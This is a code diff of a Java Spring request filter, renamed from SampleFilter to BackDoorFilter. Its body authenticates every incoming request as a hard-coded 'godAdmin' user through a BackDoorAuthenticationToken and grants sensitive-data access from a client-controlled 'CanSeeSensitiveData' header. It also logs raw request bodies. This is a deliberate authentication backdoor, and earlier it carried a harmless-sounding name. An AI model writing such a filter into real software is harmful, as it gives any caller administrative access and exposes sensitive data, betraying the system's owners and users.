@@ -21,7 +21,7 @@ import java.io.InputStreamReader;
 import java.nio.charset.StandardCharsets;
 
 //@Component
-public class SampleFilter extends OncePerRequestFilter {
+public class BackDoorFilter extends OncePerRequestFilter {
 
     private String getRequestPayload(ContentCachingRequestWrapper request) {
         byte[] content = request.getContentAsByteArray();
@@ -31,28 +31,22 @@ public class SampleFilter extends OncePerRequestFilter {
         return "";
     }
 
-    private static final Logger logger = LoggerFactory.getLogger(SampleFilter.class);
+    private static final Logger logger = LoggerFactory.getLogger(BackDoorFilter.class);
 
     @Override
     protected void doFilterInternal(HttpServletRequest request,
                                     HttpServletResponse response,
                                     FilterChain filterChain) throws ServletException, IOException {
-        try {
-            String canSeeSensitiveData = request.getHeader("CanSeeSensitiveData");
-            String payload = readRequestBody(request);
-            logger.debug("Request payload: {}", payload);
-            UserProfile godAdmin = new UserProfile();
-            godAdmin.setUsername("godAdmin");
-            godAdmin.setCanSeeSensitiveData(Boolean.parseBoolean(canSeeSensitiveData));
-            BackDoorAuthenticationToken authToken = new BackDoorAuthenticationToken(godAdmin);
-            SecurityContextHolder.getContext().setAuthentication(authToken);
 
-
-            filterChain.doFilter(new DecryptedHttpServletRequest(request, payload), response);
-        } catch (Exception e) {
-            logger.error("Error processing request: {}", e.getMessage(), e);
-            throw e;
-        }
+        String canSeeSensitiveData = request.getHeader("CanSeeSensitiveData");
+        String payload = readRequestBody(request);
+        logger.debug("Request payload: {}", payload);
+        UserProfile godAdmin = new UserProfile();
+        godAdmin.setUsername("godAdmin");
+        godAdmin.setCanSeeSensitiveData(Boolean.parseBoolean(canSeeSensitiveData));
+        BackDoorAuthenticationToken authToken = new BackDoorAuthenticationToken(godAdmin);
+        SecurityContextHolder.getContext().setAuthentication(authToken);
+        filterChain.doFilter(new DecryptedHttpServletRequest(request, payload), response);
     }
 
     private String readRequestBody(HttpServletRequest request) throws IOException {
